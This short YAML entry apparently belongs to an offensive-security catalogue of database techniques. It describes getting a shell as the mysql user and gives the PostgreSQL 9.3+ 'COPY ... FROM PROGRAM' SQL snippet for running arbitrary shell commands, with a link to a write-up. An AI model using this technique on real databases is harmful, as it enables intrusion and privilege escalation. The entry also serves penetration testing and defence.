---
functions:
  gain-access:
    - description: Use code execution to pop a shell in the context of the mysql user
  privilege-escalation:
    - description: Use code execution to escalate privileges if postgres is running as root
      code: |
        version 9.3 +
        CREATE TABLE cmd_exec(cmd_output text);
        COPY cmd_exec FROM PROGRAM '<shell commands>';SELECT * FROM cmd_exec;

resources : |
  https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
---

